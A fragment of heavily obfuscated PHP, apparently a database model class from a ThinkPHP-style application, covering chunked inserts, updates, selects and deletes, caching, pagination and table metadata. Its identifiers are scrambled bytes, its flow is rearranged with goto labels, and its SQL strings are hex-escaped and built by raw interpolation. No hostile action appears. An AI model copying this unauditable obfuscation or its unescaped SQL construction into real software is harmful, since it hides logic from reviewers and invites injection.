$this->dataBeforeFilter($BëÎ³à³È®, $fø‘·‹Îé†[340]); } protected function _beforeUpdate(&$f¡­Ş–êÁÕ, $fì¯¹°ó‹Ö) { $dŠÓì£†À =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->checkDataAutoHas($dŠÓì£†À[341])) { return; } $this->dataBeforeFilter($f¡­Ş–êÁÕ, $dŠÓì£†À[341]); } protected function _afterSelect(&$eË‰ ‘Ûì§, $bí‹İå‚ôñ) { if (!is_array($eË‰ ‘Ûì§)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö¹ñÒÁ²÷][342])) { return; } foreach ($eË‰ ‘Ûì§ as &$E Ÿ¿±ñ™) { $this->dataAfterFilter($E Ÿ¿±ñ™); } } protected function _afterFind(&$BìÈÛªø¥‘, $eµ»–Â‘ÒŒ) { if (!is_array($BìÈÛªø¥‘)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö¹ñÒÁ²÷][342])) { return; } $this->dataAfterFilter($BìÈÛªø¥‘); } public function setAutoIncrement($Dà…ã°Ø­Ù) { $FğŸ…‰ó¯Œ = array($this->getPk() => $Dà…ã°Ø­Ù); $dœñ«§Û£ = $this->data($FğŸ…‰ó¯Œ)->add(); if ($dœñ«§Û£) { $this->delete($dœñ«§Û£); } } public function getAutoIncrement() { $fÌĞ‰ÍÓ“ = $this->getTableName(); $cÓŠÇãƒ›Ç = $this->max($this->getPk()); $aíİËå«µ = $this->query("\x73\x68\x6f\x77\40\x74\x61\142\x6c\145\x20\163\x74\x61\164\x75\163\40\x77\x68\x65\162\145\40\116\x61\x6d\x65\75\47{$fÌĞ‰ÍÓ“}\47"); $DŞ¶èÕ¿ = $aíİËå«µ[0][$_SERVER[Ö¹ñÒÁ²÷][343]]; $dìò¥ ¦•È = max($cÓŠÇãƒ›Ç, $DŞ¶èÕ¿); return $dìò¥ ¦•È; } protected function _callBefore($fäµÎ‡ÇĞÅ, $BëŞ„÷‘Ó) { return $this->cacheCallCheck($fäµÎ‡ÇĞÅ, $BëŞ„÷‘Ó, !1); } protected function _callAfter($Dòªµœóï, $a×İ¥Ûùª²) { return $this->cacheCallCheck($Dòªµœóï, $a×İ¥Ûùª², !0); } protected function cacheFunctionAlias($EØš÷ÍÅÀ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($b‰·Üåê‹«, $Fôæ»Å¬Á†, $bª’¿«åÅÇ = false) { $cŒ”ƒ„  = $this->cacheFunctionAlias($Fôæ»Å¬Á†); if (!$cŒ”ƒ„ ) { return; } foreach ($cŒ”ƒ„  as $eÔ«¶Á‚£¥ => $fÒ¿¯æ¿¸â) { $d¢©Ÿõ¿·ñ = $fÒ¿¯æ¿¸â[0]; $dÖ¸øÑ‚Æğ = explode($_SERVER[Ö¹ñÒÁ²÷][47], $fÒ¿¯æ¿¸â[1]); if ($b‰·Üåê‹« == $eÔ«¶Á‚£¥) { return $this->cacheFunctionGet($eÔ«¶Á‚£¥, $d¢©Ÿõ¿·ñ); } if ($bª’¿«åÅÇ && in_array($b‰·Üåê‹«, $dÖ¸øÑ‚Æğ)) { $this->cacheFunctionClear($eÔ«¶Á‚£¥, $d¢©Ÿõ¿·ñ); } } } public function cacheFunctionGet($DÛñ·¡ÊØ°, $a–Á…Î»Ñê) { $eÖ¹ñîÆÀš = $this->cacheKeyMake($DÛñ·¡ÊØ°, $a–Á…Î»Ñê); $aÍ÷§‘ƒ¼ = Cache::get($eÖ¹ñîÆÀš); if (!is_array($aÍ÷§‘ƒ¼)) { $aÍ÷§‘ƒ¼ = call_user_func_array(array($this, $DÛñ·¡ÊØ°), array($a–Á…Î»Ñê, !0)); Cache::set($eÖ¹ñîÆÀš, $aÍ÷§‘ƒ¼); } return $aÍ÷§‘ƒ¼; } public function cacheFunctionClear($eõë‹™‘†, $cĞïî“¾‡–) { $a–ø„‹«¢ = $cĞïî“¾‡–; if (!is_array($cĞïî“¾‡–)) { $a–ø„‹«¢ = array($cĞïî“¾‡–); } foreach ($a–ø„‹«¢ as $eäˆ‰ï¸Ş’) { $a‚¡¯„¸³ = $this->cacheKeyMake($eõë‹™‘†, $eäˆ‰ï¸Ş’); Cache::remove($a‚¡¯„¸³); } } private function cacheKeyMake($CÏ¹²İó°†, $D‰Ğ¯ŠÏËš) { $EÊŒÛäæ¨‘ =& $_SERVER[Ö¹ñÒÁ²÷]; return get_class($this) . $EÊŒÛäæ¨‘[70] . $CÏ¹²İó°† . $EÊŒÛäæ¨‘[344] . $D‰Ğ¯ŠÏËš; } protected function selectPage($cŠí”ŠÓ“¾ = 200, $b‘ƒ‰·¹‹ = 1) { goto FÏò¸Â±÷; Cğº¯œÓÏ­: $this->optionsValue($dêƒ†¤ô‘Â); $F¶ÍÆ…º’ = $this->page($b‘ƒ‰·¹‹, $cŠí”ŠÓ“¾)->select(); $F¶ÍÆ…º’ = is_array($F¶ÍÆ…º’) ? $F¶ÍÆ…º’ : array(); goto e†îµƒéòì; FÏò¸Â±÷: $BùÍª²ã›® =& $_SERVER[Ö¹ñÒÁ²÷]; global $in; $dêƒ†¤ô‘Â = $this->optionsValue(); goto AÎÙ²øÖ¤; EØÏÆ¦¸Ôµ: $cÚ’³ØŒ…Ã = $dêƒ†¤ô‘Â; $cÚ’³ØŒ…Ã[$BùÍª²ã›®[346]] = array(); $this->optionsValue($cÚ’³ØŒ…Ã); goto EôÉöÜ­–ì; AÎÙ²øÖ¤: $fÙÌ¬ßÃ»ì = 4000; $cŠí”ŠÓ“¾ = isset($in[$BùÍª²ã›®[345]]) ? $in[$BùÍª²ã›®[345]] : $cŠí”ŠÓ“¾; if ($cŠí”ŠÓ“¾ === -1) { unset($in[$BùÍª²ã›®[345]]); $fÙÌ¬ßÃ»ì = 100000000; $cŠí”ŠÓ“¾ = $fÙÌ¬ßÃ»ì; } goto EØÏÆ¦¸Ôµ; b²†Ä‚Éï£: $FÛè–Œ­£© = ceil($A„ŠÎÌÖ¤Ã / $cŠí”ŠÓ“¾); $b‘ƒ‰·¹‹ = intval(isset($in[$BùÍª²ã›®[336]]) ? $in[$BùÍª²ã›®[336]] : $b‘ƒ‰·¹‹); $b‘ƒ‰·¹‹ = $b‘ƒ‰·¹‹ <= 1 ? 1 : ($b‘ƒ‰·¹‹ >= $FÛè–Œ­£© ? $FÛè–Œ­£© : $b‘ƒ‰·¹‹); goto Cğº¯œÓÏ­; e†îµƒéòì: if ($FÛè–Œ­£© == 1) { $A„ŠÎÌÖ¤Ã = count($F¶ÍÆ…º’); } $F‹Ì„«ˆ‡Ú = array($BùÍª²ã›®[347] => array($BùÍª²ã›®[348] => $A„ŠÎÌÖ¤Ã, $BùÍª²ã›®[345] => $cŠí”ŠÓ“¾, $BùÍª²ã›®[336] => $b‘ƒ‰·¹‹, $BùÍª²ã›®[349] => $FÛè–Œ­£©), $BùÍª²ã›®[350] => $F¶ÍÆ…º’ ? $F¶ÍÆ…º’ : array()); return $F‹Ì„«ˆ‡Ú; goto B…‘Åµñ; EôÉöÜ­–ì: $A„ŠÎÌÖ¤Ã = intval($this->count()); $cŠí”ŠÓ“¾ = intval($cŠí”ŠÓ“¾); $cŠí”ŠÓ“¾ = $cŠí”ŠÓ“¾ <= 5 ? 5 : ($cŠí”ŠÓ“¾ >= $fÙÌ¬ßÃ»ì ? $fÙÌ¬ßÃ»ì : $cŠí”ŠÓ“¾); goto b²†Ä‚Éï£; B…‘Åµñ: } protected function checkLength($a™‘ç¿ŠÌ, $BíÄ‰æ„‹ó = 0, $fˆƒä§ë¿Š = '') { $f £ñË¤¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $BíÄ‰æ„‹ó = $BíÄ‰æ„‹ó ? $BíÄ‰æ„‹ó : 65536; if (!$a™‘ç¿ŠÌ || strlen($a™‘ç¿ŠÌ) < $BíÄ‰æ„‹ó) { return; } $fˆƒä§ë¿Š = $fˆƒä§ë¿Š ? $fˆƒä§ë¿Š . $f £ñË¤¥[67] : $f £ñË¤¥[33]; show_json($fˆƒä§ë¿Š . LNG($f £ñË¤¥[351]) . "\x28{$BíÄ‰æ„‹ó}\51", !1); } protected function metaSet($fš™Š™º¶ª, $D¹¯°İõ = null, $e©Î¢Ê‰šã = null) { goto aëô†ŞÁ; aëô†ŞÁ: $AØ”ãµáÂò =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->tableMeta) { return !1; } $b’ç‰ä»½· = $this->tableMeta[$AØ”ãµáÂò[352]]; goto e²™†Ú¯Œè; eƒÉ¦Ù£´à: if (is_string($D¹¯°İõ)) { $Föêô¦“¿À[$D¹¯°İõ] = $e©Î¢Ê‰šã; } $bÔä˜ÈÓŒ¤ = array(); foreach ($Föêô¦“¿À as $C„ä“…º÷ => $dÑÇƒ˜ƒÆö) { $this->checkLength($dÑÇƒ˜ƒÆö, !1, $f¼ áÄ¢™Ï . $AØ”ãµáÂò[4] . $C„ä“…º÷); $bÔä˜ÈÓŒ¤[] = array($b’ç‰ä»½· => $fš™Š™º¶ª, $AØ”ãµáÂò[89] => $C„ä“…º÷, $AØ”ãµáÂò[355] => $dÑÇƒ˜ƒÆö); } goto dŞÁ’™•†©; fÕÏ ì…«±: if (is_null($D¹¯°İõ)) { return $cà«»ç­ÊĞ->where(array($b’ç‰ä»½· => $fš™Š™º¶ª))->delete(); } if (is_null($e©Î¢Ê‰šã)) { return $cà«»ç­ÊĞ->where($fø³ŠØš½á)->delete(); } $Föêô¦“¿À = is_array($D¹¯°İõ) ? $D¹¯°İõ : array(); goto eƒÉ¦Ù£´à; e²™†Ú¯Œè: $f¼ áÄ¢™Ï = $this->tableMeta[$AØ”ãµáÂò[353]]; $cà«»ç­ÊĞ = Model($f¼ áÄ¢™Ï); $fø³ŠØš½á = array($b’ç‰ä»½· => $fš™Š™º¶ª, $AØ”ãµáÂò[354] => $D¹¯°İõ); goto fÕÏ ì…«±; dŞÁ’™•†©: $cà«»ç­ÊĞ->where(array($b’ç‰ä»½· => $fš™Š™º¶ª))->addAll($bÔä˜ÈÓŒ¤, array(), !0); return !0; goto fåšÒâÅ; fåšÒâÅ: } public function metaGet($cïê‘¸‰ÌÄ) { goto C¸ÂñÃŠà‚; C¸ÂñÃŠà‚: $DÏù³¸Àõ‚ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->tableMeta) { return array(); } $d™¬š“²õÖ = $this->tableMeta[$DÏù³¸Àõ‚[352]]; goto e„Ôêæ…š­; CÙ±‚˜Şé: $aÉô’µíÒ¾ = array_to_keyvalue($aÉô’µíÒ¾, $DÏù³¸Àõ‚[89], $DÏù³¸Àõ‚[355]); return $aÉô’µíÒ¾; goto eéÈÆ³¸ïƒ; e„Ôêæ…š­: $C˜„™™“›° = Model($this->tableMeta[$DÏù³¸Àõ‚[353]]); $e…‹  ä¶¦ = array($d™¬š“²õÖ => $cïê‘¸‰ÌÄ); $aÉô’µíÒ¾ = $C˜„™™“›°->field($DÏù³¸Àõ‚[356])->where($e…‹  ä¶¦)->select(); goto CÙ±‚˜Şé; eéÈÆ³¸ïƒ: } private function checkDataAutoHas($aóìïâØ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $dïÃ¯“ÊÍ÷) { if (in_array($aóìïâØ, explode($_SERVER[Ö¹ñÒÁ²÷][47], $dïÃ¯“ÊÍ÷[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$B–·Ûîçœ¾, $D¡°°™¯ª‰) { $cÑ…Ú‚Òİ =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($this->dataAuto as $c½‘í††Ç™) { $Bğê‚Îì ‡ = $c½‘í††Ç™[0]; if (!in_array($D¡°°™¯ª‰, explode($cÑ…Ú‚Òİ[47], $c½‘í††Ç™[2]))) { continue; } switch (trim($c½‘í††Ç™[3])) { case $cÑ…Ú‚Òİ[305]: case $cÑ…Ú‚Òİ[306]: $CÙÍóÙìÂ = $c½‘í††Ç™[1]; $AèéòøîÇ… = isset($c½‘í††Ç™[4]) ? (array) $c½‘í††Ç™[4] : array(); if ($CÙÍóÙìÂ == $cÑ…Ú‚Òİ[186] && array_key_exists($Bğê‚Îì ‡, $B–·Ûîçœ¾)) { if (!$B–·Ûîçœ¾[$Bğê‚Îì ‡]) { unset($B–·Ûîçœ¾[$Bğê‚Îì ‡]); } break; } if (isset($B–·Ûîçœ¾[$Bğê‚Îì ‡])) { array_unshift($AèéòøîÇ…, $B–·Ûîçœ¾[$Bğê‚Îì ‡]); } if ($cÑ…Ú‚Òİ[305] == $c½‘í††Ç™[3]) { $B–·Ûîçœ¾[$Bğê‚Îì ‡] = call_user_func_array($CÙÍóÙìÂ, $AèéòøîÇ…); } else { $B–·Ûîçœ¾[$Bğê‚Îì ‡] = call_user_func_array(array(&$this, $CÙÍóÙìÂ), $AèéòøîÇ…); } break; case $cÑ…Ú‚Òİ[257]: $B–·Ûîçœ¾[$Bğê‚Îì ‡] = $B–·Ûîçœ¾[$c½‘í††Ç™[1]]; break; case $cÑ…Ú‚Òİ[278]: if (isset($B–·Ûîçœ¾[$Bğê‚Îì ‡]) && !is_string($B–·Ûîçœ¾[$Bğê‚Îì ‡])) { $B–·Ûîçœ¾[$Bğê‚Îì ‡] = json_encode_force($B–·Ûîçœ¾[$Bğê‚Îì ‡]); } break; case $cÑ…Ú‚Òİ[307]: if ($B–·Ûîçœ¾[$Bğê‚Îì ‡] === $cÑ…Ú‚Òİ[33]) { unset($B–·Ûîçœ¾[$Bğê‚Îì ‡]); } break; case $cÑ…Ú‚Òİ[308]: $B–·Ûîçœ¾[$Bğê‚Îì ‡] = $c½‘í††Ç™[1]; default: break; } } if ($D¡°°™¯ª‰ == $cÑ…Ú‚Òİ[340]) { $C×¡¸…±»î = strtolower($this->db->getDbType()); if (strpos($C×¡¸…±»î, $cÑ…Ú‚Òİ[9]) !== 0) { return; } $f‹¬ğŸ±Ÿ¼ = $this->field(!0)->fields; $fæàÏ™‘Ì = $f‹¬ğŸ±Ÿ¼[$cÑ…Ú‚Òİ[236]]; if (isset($f‹¬ğŸ±Ÿ¼[$cÑ…Ú‚Òİ[235]])) { unset($fæàÏ™‘Ì[$f‹¬ğŸ±Ÿ¼[$cÑ…Ú‚Òİ[235]]]); } foreach ($fæàÏ™‘Ì as $EêÙ®ïšæ¼ => $D¡°°™¯ª‰) { if (!isset($B–·Ûîçœ¾[$EêÙ®ïšæ¼])) { $B–·Ûîçœ¾[$EêÙ®ïšæ¼] = $cÑ…Ú‚Òİ[33]; } } } } private function dataAfterFilter(&$AÏãÁ§ØõÅ) { $d¿¥šœ”ÁÄ =& $_SERVER[Ö¹ñÒÁ²÷]; foreach ($this->dataAuto as $döœå‰ÅÆ) { $AÁÉÅÁ’º = $döœå‰ÅÆ[0]; if (!in_array($d¿¥šœ”ÁÄ[342], explode($d¿¥šœ”ÁÄ[47], $döœå‰ÅÆ[2]))) { continue; } if (!isset($AÏãÁ§ØõÅ[$AÁÉÅÁ’º])) { continue; } switch (trim($döœå‰ÅÆ[3])) { case $d¿¥šœ”ÁÄ[305]: case $d¿¥šœ”ÁÄ[306]: $f”®Û£øÒì = isset($döœå‰ÅÆ[4]) ? (array) $döœå‰ÅÆ[4] : array(); array_unshift($f”®Û£øÒì, $AÏãÁ§ØõÅ[$AÁÉÅÁ’º]); if ($d¿¥šœ”ÁÄ[305] == $döœå‰ÅÆ[3]) { $AÏãÁ§ØõÅ[$AÁÉÅÁ’º] = call_user_func_array($döœå‰ÅÆ[1], $f”®Û£øÒì); } else { $AÏãÁ§ØõÅ[$AÁÉÅÁ’º] = call_user_func_array(array(&$this, $döœå‰ÅÆ[1]), $f”®Û£øÒì); } break; case $d¿¥šœ”ÁÄ[257]: $AÏãÁ§ØõÅ[$AÁÉÅÁ’º] = $AÏãÁ§ØõÅ[$döœå‰ÅÆ[1]]; break; case $d¿¥šœ”ÁÄ[278]: $F¦­ÛòÎƒ = $AÏãÁ§ØõÅ[$AÁÉÅÁ’º]; $AÏãÁ§ØõÅ[$AÁÉÅÁ’º] = json_decode($F¦­ÛòÎƒ, !0); if (is_null($AÏãÁ§ØõÅ[$AÁÉÅÁ’º])) { $AÏãÁ§ØõÅ[$AÁÉÅÁ’º] = $F¦­ÛòÎƒ; } break; case $d¿¥šœ”ÁÄ[307]: if ($AÏãÁ§ØõÅ[$AÁÉÅÁ’º] === $d¿¥šœ”ÁÄ[33]) { unset($AÏãÁ§ØõÅ[$AÁÉÅÁ’º]); } break; case $d¿¥šœ”ÁÄ[308]: $AÏãÁ§ØõÅ[$AÁÉÅÁ’º] = $döœå‰ÅÆ[1]; default: break; } } } public function saveAll($C¦Ø…‡¢¾Ÿ) { goto b‚´ñ çôö; b‚´ñ çôö: $fåøÛ¾Æ”¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $f‰ˆï§¸Éä = $this->tablePrefix . $this->tableName; $Dõˆ§óËİ = self::SQL_WHERE_IN_CHUNK; goto f³ÖÍ—†©Ê; b“½­ñïĞ…: $FåÓöéÜÍ = array(); $aĞèÉÍÎ¹ = count($C¦Ø…‡¢¾Ÿ); for ($Bù¾…ó¦¾ = 0; $Bù¾…ó¦¾ < $aĞèÉÍÎ¹; $Bù¾…ó¦¾++) { $dÎóŸ¤Õ”¤ = $C¦Ø…‡¢¾Ÿ[$Bù¾…ó¦¾]; if (!is_array($dÎóŸ¤Õ”¤) || count($dÎóŸ¤Õ”¤) != 4) { continue; } $fâÚ™«ô‘ = "\125\120\104\x41\x54\105\40{$f‰ˆï§¸Éä}\40\x53\x45\124\40{$dÎóŸ¤Õ”¤[2]}\40\75\x20\103\x41\123\105\40{$dÎóŸ¤Õ”¤[0]}\x20\12"; if ($Bï´ƒå¹å == 0) { $FÊÊŠŒ‰ôì = $fâÚ™«ô‘; } $FåÓöéÜÍ[] = $fåøÛ¾Æ”¯[112] . $dÎóŸ¤Õ”¤[1] . $fåøÛ¾Æ”¯[112]; $Bï´ƒå¹å++; $FÊÊŠŒ‰ôì .= "\40\127\110\105\116\40\x27{$dÎóŸ¤Õ”¤[1]}\47\x20\x54\x48\105\116\x20\47{$dÎóŸ¤Õ”¤[3]}\47\40\xa"; if ($Bï´ƒå¹å == $Dõˆ§óËİ || $Bù¾…ó¦¾ == $aĞèÉÍÎ¹ - 1) { goto a°ÇÅ­Œ¶Ä; e²·äÌ…É: $FåÓöéÜÍ = array(); goto CË¾æíá¾; fêÓ“…•¼„: $Bï´ƒå¹å = 0; $FÊÊŠŒ‰ôì = $fâÚ™«ô‘; $this->chunkEventCheck(count($FåÓöéÜÍ)); goto e²·äÌ…É; a°ÇÅ­Œ¶Ä: $C„ïæ›ŒÕ³ = implode($fåøÛ¾Æ”¯[47], $FåÓöéÜÍ); $FÊÊŠŒ‰ôì .= "\40\x45\x4e\104\40\40\x57\110\x45\122\105\x20{$dÎóŸ¤Õ”¤[0]}\40\111\116\x20\50{$C„ïæ›ŒÕ³}\x29\40"; $this->execute($FÊÊŠŒ‰ôì); goto fêÓ“…•¼„; CË¾æíá¾: } } goto B¦½Ô“¬Ïå; B¦½Ô“¬Ïå: $this->chunkEventSet(); goto a‰Ø§éÇ¡§; f³ÖÍ—†©Ê: $C¦Ø…‡¢¾Ÿ = is_array($C¦Ø…‡¢¾Ÿ) ? $C¦Ø…‡¢¾Ÿ : array(); $FÊÊŠŒ‰ôì = $fåøÛ¾Æ”¯[357]; $Bï´ƒå¹å = 0; goto b“½­ñïĞ…; a‰Ø§éÇ¡§: } public function saveAllEach($FÔÒà®ŠµÀ) { $eø’õÊÆó =& $_SERVER[Ö¹ñÒÁ²÷]; $e‰—Ã¥…„ = $this->tablePrefix . $this->tableName; foreach ($FÔÒà®ŠµÀ as $E¡²ÓÙÕä) { if (!is_array($E¡²ÓÙÕä) || count($E¡²ÓÙÕä) != 4) { continue; } $F–Øô–À”‘ = $E¡²ÓÙÕä[0] . $eø’õÊÆó[358] . $E¡²ÓÙÕä[1] . $eø’õÊÆó[112]; $d‚¡îÓ‰°¼ = $E¡²ÓÙÕä[2] . $eø’õÊÆó[358] . $E¡²ÓÙÕä[3] . $eø’õÊÆó[112]; $Eöó‡â—œì = "\x75\160\x64\x61\164\x65\40{$e‰—Ã¥…„}\x20\163\x65\164\x20{$d‚¡îÓ‰°¼}\40\x77\x68\145\x72\x65\x20{$F–Øô–À”‘}\73"; $this->execute($Eöó‡â—œì); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($a—£¥õÕß© = false, $a¬±ÁÃ‡˜ = false) { $this->_chunkEvent = $a—£¥õÕß©; $this->_chunkEventParam = $a¬±ÁÃ‡˜; } private function chunkEventCheck($eìô½Ì) { if (!$this->_chunkEvent) { return; } $e¸½“µ±î = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $e¸½“µ±î[$_SERVER[Ö¹ñÒÁ²÷][359]] = $eìô½Ì; Hook::trigger($this->_chunkEvent, $e¸½“µ±î); } public function addAll($f‡Ÿé²™÷¨, $BƒÑÜç•·· = array(), $b®’¡èÓ¾’ = false) { goto eÎÒïè‚ë; d¡Ä·‰Ö¦‡: if (method_exists($this->db, $eƒË—ˆØµ[256])) { for ($C”£¹êÛ‡ = 0; $C”£¹êÛ‡ < count($f‡Ÿé²™÷¨); $C”£¹êÛ‡ += $A‹¾ğïäÃÌ) { $bø­ÆË®§Ø = array_slice($f‡Ÿé²™÷¨, $C”£¹êÛ‡, $A‹¾ğïäÃÌ); if (!is_array($bø­ÆË®§Ø) || count($bø­ÆË®§Ø) == 0) { break; } $c„’…µ‹Ì = $this->db->insertAll($bø­ÆË®§Ø, $BƒÑÜç•··, $b®’¡èÓ¾’); $this->chunkEventCheck(count($bø­ÆË®§Ø)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($f‡Ÿé²™÷¨ as $c×†ã­á˜ => $bÆ¹ç”‚Úí) { $c„’…µ‹Ì = $this->db->insert($bÆ¹ç”‚Úí, $BƒÑÜç•··, $b®’¡èÓ¾’); } $this->commit(); } if (!1 !== $c„’…µ‹Ì) { $EœñîÃÄÓÎ = $this->getLastInsID(); if ($EœñîÃÄÓÎ) { return $EœñîÃÄÓÎ; } } return $c„’…µ‹Ì; goto eè›°¥´Ë; eÈĞóõ©Å: if (empty($f‡Ÿé²™÷¨)) { $this->error = think_lang($eƒË—ˆØµ[255]); return !1; } $BƒÑÜç•·· = $this->_parseOptions($BƒÑÜç•··); foreach ($f‡Ÿé²™÷¨ as $c×†ã­á˜ => $bÆ¹ç”‚Úí) { $f‡Ÿé²™÷¨[$c×†ã­á˜] = $this->_facade($bÆ¹ç”‚Úí); $this->_beforeInsert($f‡Ÿé²™÷¨[$c×†ã­á˜], $BƒÑÜç•··); } goto d¡Ä·‰Ö¦‡; eÎÒïè‚ë: $eƒË—ˆØµ =& $_SERVER[Ö¹ñÒÁ²÷]; ignore_timeout(); $A‹¾ğïäÃÌ = self::SQL_WHERE_IN_CHUNK; goto eÈĞóõ©Å; eè›°¥´Ë: } public function save($dãœ¯øòŒ‹ = '', $c¾ä«Œ„† = array()) { goto FÀÎåâ«íÜ; dÂœ˜æ Ş: $d‰‹…†ÁÔ = $bŒˆÌˆİ½¯[$dÀÅ½…Âå‰[259]][$eŒ½çÉ»†][1]; $d‰‹…†ÁÔ = is_array($d‰‹…†ÁÔ) ? $d‰‹…†ÁÔ : array(); $D©“åòÛÒ¬ = count($d‰‹…†ÁÔ); goto dº¼÷¹õÂĞ; dº¼÷¹õÂĞ: for ($A…ÕÃ¡ëº‰ = 0; $A…ÕÃ¡ëº‰ < $D©“åòÛÒ¬; $A…ÕÃ¡ëº‰ += $cÌÉùØ˜ŠŒ) { $eäÖ§«ù¶‹ = array_slice($d‰‹…†ÁÔ, $A…ÕÃ¡ëº‰, $cÌÉùØ˜ŠŒ); if (!is_array($eäÖ§«ù¶‹) || count($eäÖ§«ù¶‹) == 0) { break; } $bŒˆÌˆİ½¯[$dÀÅ½…Âå‰[259]][$eŒ½çÉ»†][1] = $eäÖ§«ù¶‹; $this->optionsValue($bŒˆÌˆİ½¯); $CÓ„ÍÂÆäĞ += parent::save($dãœ¯øòŒ‹, $c¾ä«Œ„†); $this->chunkEventCheck(count($eäÖ§«ù¶‹)); } $this->chunkEventSet(); return $CÓ„ÍÂÆäĞ; goto aØ¨ëï‰òï; FÀÎåâ«íÜ: $dÀÅ½…Âå‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÌÉùØ˜ŠŒ = self::SQL_WHERE_IN_CHUNK; $bŒˆÌˆİ½¯ = $this->optionsValue(); goto e¿¡ÂÜŞÏ°; e¿¡ÂÜŞÏ°: $eŒ½çÉ»† = $this->findWhereField($bŒˆÌˆİ½¯); if (!$eŒ½çÉ»†) { return parent::save($dãœ¯øòŒ‹, $c¾ä«Œ„†); } $CÓ„ÍÂÆäĞ = 0; goto dÂœ˜æ Ş; aØ¨ëï‰òï: } public function add($f³ƒ´ÄÂÅ = '', $E©–©³·êŒ = array(), $aÖˆƒŒ°ó = false) { if ($this->addTaskStatus && is_array($f³ƒ´ÄÂÅ)) { $this->addTaskData[] = $f³ƒ´ÄÂÅ; return; } return parent::add($f³ƒ´ÄÂÅ, $E©–©³·êŒ, $aÖˆƒŒ°ó); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($fÖ‡ˆÇâ´ï = array()) { goto d‡ùĞ£Î­‡; d‡ùĞ£Î­‡: $døÛŒ†…°ƒ =& $_SERVER[Ö¹ñÒÁ²÷]; $D£œ‡·õŠç = self::SQL_WHERE_IN_CHUNK; $dõ÷…­†È = $this->optionsValue(); goto B´ï³«Ë¤ ; FÅ©®­Ã™÷: $c…Ô¿Æ”Ä‚ = is_array($c…Ô¿Æ”Ä‚) ? $c…Ô¿Æ”Ä‚ : array(); $eÍ˜äçä¦Å = null; for ($fïÊì¾ÏÂÔ = 0; $fïÊì¾ÏÂÔ < count($c…Ô¿Æ”Ä‚); $fïÊì¾ÏÂÔ += $D£œ‡·õŠç) { $F§Ìƒµ‚¿Ä = array_slice($c…Ô¿Æ”Ä‚, $fïÊì¾ÏÂÔ, $D£œ‡·õŠç); if (!is_array($F§Ìƒµ‚¿Ä) || count($F§Ìƒµ‚¿Ä) == 0) { break; } $dõ÷…­†È[$døÛŒ†…°ƒ[259]][$a²‡ƒ÷‡»î][1] = $F§Ìƒµ‚¿Ä; $this->optionsValue($dõ÷…­†È); $dßÎÔÙç° = parent::select($fÖ‡ˆÇâ´ï); if (!$dßÎÔÙç°) { continue; } if (is_null($eÍ˜äçä¦Å)) { $eÍ˜äçä¦Å = array(); } $eÍ˜äçä¦Å = array_merge($eÍ˜äçä¦Å, $dßÎÔÙç°); } goto aÙºë¹; B´ï³«Ë¤ : $a²‡ƒ÷‡»î = $this->findWhereField($dõ÷…­†È); if (!$a²‡ƒ÷‡»î || isset($dõ÷…­†È[$døÛŒ†…°ƒ[276]]) || isset($dõ÷…­†È[$døÛŒ†…°ƒ[336]])) { return parent::select($fÖ‡ˆÇâ´ï); } $c…Ô¿Æ”Ä‚ = $dõ÷…­†È[$døÛŒ†…°ƒ[259]][$a²‡ƒ÷‡»î][1]; goto FÅ©®­Ã™÷; aÙºë¹: return $eÍ˜äçä¦Å; goto cØ¡¡¯¨©; cØ¡¡¯¨©: } public function delete($EœãßŒÉå = array()) { goto DÀ‹›ÃØñ; fĞ®ÏÛ—‚õ: $c…ó¶ˆÚ¬ = $this->findWhereField($E¸Õäø‰¡); if (!$c…ó¶ˆÚ¬) { return parent::delete($EœãßŒÉå); } $bÖ›‚¦˜á¶ = 0; goto eŸ˜Èª‡ñ”; eŸ˜Èª‡ñ”: $F¾…É‰÷×ï = $E¸Õäø‰¡[$Aì×é¥Ììš[259]][$c…ó¶ˆÚ¬][1]; $F¾…É‰÷×ï = is_array($F¾…É‰÷×ï) ? $F¾…É‰÷×ï : array(); for ($a¦Û®Åñ¾ = 0; $a¦Û®Åñ¾ < count($F¾…É‰÷×ï); $a¦Û®Åñ¾ += $C…µ¨É²³) { $BĞˆÔõ¾Ü² = array_slice($F¾…É‰÷×ï, $a¦Û®Åñ¾, $C…µ¨É²³); if (!is_array($BĞˆÔõ¾Ü²) || count($BĞˆÔõ¾Ü²) == 0) { break; } $E¸Õäø‰¡[$Aì×é¥Ììš[259]][$c…ó¶ˆÚ¬][1] = $BĞˆÔõ¾Ü²; $this->optionsValue($E¸Õäø‰¡); $bÖ›‚¦˜á¶ += parent::delete($EœãßŒÉå); } goto EÙ¥ÈÜÈŞ™; EÙ¥ÈÜÈŞ™: return $bÖ›‚¦˜á¶; goto b½‡¥Î¦ËÃ; DÀ‹›ÃØñ: $Aì×é¥Ììš =& $_SERVER[Ö¹ñÒÁ²÷]; $C…µ¨É²³ = self::SQL_WHERE_IN_CHUNK; $E¸Õäø‰¡ = $this->optionsValue(); goto fĞ®ÏÛ—‚õ; b½‡¥Î¦ËÃ: } private function findWhereField($b±®ï¸øâ) { $C…çÙ´¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $BŒÅ°Š‚“ = self::SQL_WHERE_IN_CHUNK; if (!is_array($b±®ï¸øâ) || !is_array($b±®ï¸øâ[$C…çÙ´¸[259]])) { return !1; } foreach ($b±®ï¸øâ[$C…çÙ´¸[259]] as $Aõ½Û¯‡ÛÒ => $a¡ˆÛÙ‚˜Ä) { if (is_array($a¡ˆÛÙ‚˜Ä) && isset($a¡ˆÛÙ‚˜Ä[0]) && is_string($a¡ˆÛÙ‚˜Ä[0]) && 